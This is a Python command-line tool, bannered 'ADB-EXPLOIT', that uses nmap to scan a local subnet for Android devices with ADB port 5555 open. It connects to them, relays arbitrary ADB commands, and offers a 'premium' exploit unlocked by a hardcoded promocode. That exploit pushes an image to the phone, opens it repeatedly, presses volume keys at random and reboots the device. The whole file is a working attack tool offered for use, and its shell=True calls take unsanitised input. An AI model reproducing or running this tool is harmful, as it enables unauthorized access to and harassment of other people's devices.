import os
import subprocess
import sys
from colorama import Fore, Style, init
from termcolor import colored
from colorama import Back
import itertools

# Initialize colorama
init(autoreset=True)

# Global variables
connected = False
premium = False

# Function to create a smooth color gradient
def gradient(start_color, end_color, steps):
    def interpolate(start, end, t):
        return int(start + (end - start) * t)
    
    start_rgb = [int(start_color[i:i+2], 16) for i in (1, 3, 5)]
    end_rgb = [int(end_color[i:i+2], 16) for i in (1, 3, 5)]
    
    colors = []
    for i in range(steps):
        t = i / (steps - 1)
        r = interpolate(start_rgb[0], end_rgb[0], t)
        g = interpolate(start_rgb[1], end_rgb[1], t)
        b = interpolate(start_rgb[2], end_rgb[2], t)
        colors.append(f"#{r:02x}{g:02x}{b:02x}")
    
    return colors

def print_banner():
    banner_lines = [
        "█████╗ ██████╗ ██████╗       ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
        "██╔══██╗██╔══██╗██╔══██╗      ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
        "███████║██║  ██║██████╔╝█████╗█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
        "██╔══██║██║  ██║██╔══██╗╚════╝██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
        "██║  ██║██████╔╝██████╔╝      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
        "╚═╝  ╚═╝╚═════╝ ╚═════╝       ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    ]

    # Define color gradient
    gradient_colors = gradient("#ff0000", "#0000ff", len(banner_lines[0]))

    # Print each line with smooth color transition
    for i, line in enumerate(banner_lines):
        color_index = 0
        for char in line:
            color = gradient_colors[color_index % len(gradient_colors)]
            print(f"\033[38;2;{int(color[1:3], 16)};{int(color[3:5], 16)};{int(color[5:7], 16)}m{char}", end="")
            color_index += 1
        print(Style.RESET_ALL)

def check_promocode():
    global premium
    promocode = input("Enter promocode to unlock premium features: ")
    if promocode == "ashnet":
        premium = True
        print("Premium activated!")
    else:
        print("Incorrect promocode. Continuing without premium features.")

def show_help():
    print(f"""
Available commands:
- help        : Show this help message
- scan        : Scan the network for devices with port 5555 open
- connect     : Connect to a device using IP and port (default 5555)
- disconnect  : Disconnect from the currently connected device
- exploit     : Run the exploit on the connected device (premium only)
- <adb command>: Run any ADB command on the connected device (when connected)
""")

def scan_network():
    # Prompt the user for the gateway
    gateway = input("Enter the last octet of your gateway (e.g., 18 for 192.168.18.): ")
    subnet = f"192.168.{gateway}.0/24"

    print(f"Scanning network {subnet} for devices with open port 5555...")
    
    # Use nmap to scan for devices with port 5555 open
    command = f"nmap -p 5555 --open -sV {subnet}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    # Parse the nmap output
    for line in result.stdout.splitlines():
        if "Nmap scan report for" in line:
            ip_address = line.split()[-1]
        elif "5555/tcp open" in line:
            print(f"{ip_address} is exploitable (port 5555 open)")

def connect_to_device(ip, port=5555):
    global connected
    try:
        command = f"adb connect {ip}:{port}"
        subprocess.run(command, check=True, shell=True)
        connected = True
        print(f"{Fore.GREEN}[Connected] -$ ")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[Not Connected] -$ ")

def disconnect_device():
    global connected
    command = "adb disconnect"
    subprocess.run(command, shell=True)
    connected = False
    print(f"{Fore.RED}[Not Connected] -$ ")

def run_exploit():
    if not connected:
        print("You need to be connected to a device to use exploit.")
        return
    
    # Ensure the folder exists on the device
    subprocess.run("adb shell mkdir -p /storage/emulated/0/hhh", shell=True)
    
    # Push the image to the device
    subprocess.run("adb push ./AshNet/adb/mid.jpg /storage/emulated/0/hhh/mid.jpg", shell=True)

    # Show the image and close it 10 times
    for _ in range(10):
        subprocess.run("adb shell am start -a android.intent.action.VIEW -d file:///storage/emulated/0/hhh/mid.jpg", shell=True)
        subprocess.run("adb shell input keyevent 4", shell=True)  # Simulate back button press

    # Randomly adjust volume
    import random
    for _ in range(10):
        volume_button = 24 if random.choice([True, False]) else 25
        subprocess.run(f"adb shell input keyevent {volume_button}", shell=True)
    
    # Reboot the device
    subprocess.run("adb reboot", shell=True)

def main():
    print_banner()
    check_promocode()

    while True:
        command = input(f"{Fore.RED}[Not Connected] -$ " if not connected else f"{Fore.GREEN}[Connected] -$ ").strip()

        if command == "help":
            show_help()
        elif command == "scan":
            scan_network()
        elif command == "connect":
            ip = input("Enter IP: ")
            port = input("Enter port (default 5555): ") or "5555"
            connect_to_device(ip, port)
        elif command == "disconnect":
            disconnect_device()
        elif command == "exploit":
            if premium:
                run_exploit()
            else:
                print("This command is available in premium only.")
        else:
            if connected:
                try:
                    subprocess.run(f"adb {command}", shell=True)
                except Exception as e:
                    print(f"Error running command: {e}")
            else:
                print("You need to be connected to a device to run ADB commands.")

if __name__ == "__main__":
    main()
